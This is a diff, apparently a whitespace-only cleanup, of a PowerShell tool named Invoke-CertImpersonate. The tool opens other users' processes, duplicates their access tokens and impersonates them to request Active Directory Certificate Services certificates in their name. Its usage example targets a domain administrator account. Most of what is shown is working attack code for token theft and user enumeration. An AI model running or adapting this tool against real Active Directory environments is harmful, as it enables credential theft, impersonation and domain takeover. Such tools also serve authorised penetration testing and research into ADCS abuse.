@@ -1,20 +1,15 @@
 <#
 .SYNOPSIS
     This PowerShell script performs impersonation to request a certificate for a given user using Active Directory Certificate Services (ADCS).
-
 .DESCRIPTION
     The script uses Windows API functions to obtain a token for a specified user process, impersonates that user, and then request a certificate. 
     The script generates a random password for the certificate.
-
 .PARAMETER Username
     The username of the target user in DOMAIN\User format.
-
 .PARAMETER CA
     The configuration string for the Certificate Authority (CA) including the CA server name and CA name in ADCS.Server\CA-Name format.
-
 .PARAMETER Template
     The name of the certificate template to be used for the certificate request.
-
 .NOTES
     Invoke-CertImpersonate -Username <DOMAIN>\<Username> -CA <ADCS Server>\<CA> -Template <Template>"
     Invoke-CertImpersonate -Username CICADA\DomainAdmin -CA CA.cicada8.local\CICADA-ADCS-CA -Template User"
@@ -31,31 +26,24 @@ param (
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-
 public class Win32 {
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
-
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     public static extern bool CloseHandle(IntPtr hObject);
-
     [DllImport("advapi32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
-
     [DllImport("advapi32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
-
     [DllImport("advapi32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
-
     [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
     [return: MarshalAs(UnmanagedType.Bool)]
     public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
     [StructLayout(LayoutKind.Sequential)]
     public struct PROCESS_INFORMATION {
         public IntPtr hProcess;
@@ -63,7 +51,6 @@ public class Win32 {
         public uint dwProcessId;
         public uint dwThreadId;
     }
-
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
     public struct STARTUPINFO {
         public uint cb;
@@ -85,7 +72,6 @@ public class Win32 {
         public IntPtr hStdOutput;
         public IntPtr hStdError;
     }
-
     public const uint PROCESS_QUERY_INFORMATION = 0x0400;
     public const uint TOKEN_DUPLICATE = 0x0002;
     public const uint TOKEN_IMPERSONATE = 0x0004;
@@ -93,14 +79,12 @@ public class Win32 {
     public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
     public const uint TOKEN_ADJUST_DEFAULT = 0x0080;
     public const uint TOKEN_ADJUST_SESSIONID = 0x0100;
-
     public enum SECURITY_IMPERSONATION_LEVEL {
         SecurityAnonymous,
         SecurityIdentification,
         SecurityImpersonation,
         SecurityDelegation
     }
-
     public enum TOKEN_TYPE {
         TokenPrimary = 1,
         TokenImpersonation
@@ -114,7 +98,7 @@ function Get-Token {
         [Parameter(Mandatory = $true)]
         [int]$ProcId
     )
-    
+
     $processHandle = [Win32]::OpenProcess([Win32]::PROCESS_QUERY_INFORMATION, $false, $ProcId)
     if ($processHandle -eq [IntPtr]::Zero) {
         $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
@@ -165,7 +149,7 @@ function Get-UserTokens {
             continue
         }
         $processOwnerName = "$($processOwnerObject.Domain)\$($processOwnerObject.User)"
-        
+
         if ([string]::IsNullOrEmpty($Username) -or $processOwnerName -eq $Username) {
             Write-Host "[DEBUG] Process PID: $($process.ProcessId), Owner: $($processOwnerName)"
             $token = Get-Token -ProcId $process.ProcessId
@@ -194,13 +178,13 @@ function Get-UserDN {
     # Create a new DirectorySearcher object
     $searcher = New-Object System.DirectoryServices.DirectorySearcher
     $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName=$username))"
-    
+
     # Set the properties to load (DN)
     $searcher.PropertiesToLoad.Add("distinguishedName") | Out-Null
 
     # Perform the search
     $result = $searcher.FindOne()
-    
+
     if ($result -ne $null) {
         return $result.Properties["distinguishedname"][0]
     }
@@ -233,7 +217,7 @@ function Invoke-CertImpersonate {
         $tokens = Get-UserTokens -Username $Username
         if ($tokens.Count -gt 0) {
             $token = $tokens[0]
-            
+
             # Get FQDN of current domain
             $domain = $env:USERDNSDOMAIN
             $userDN = Get-UserDN -username $Username.Split('\')[-1]
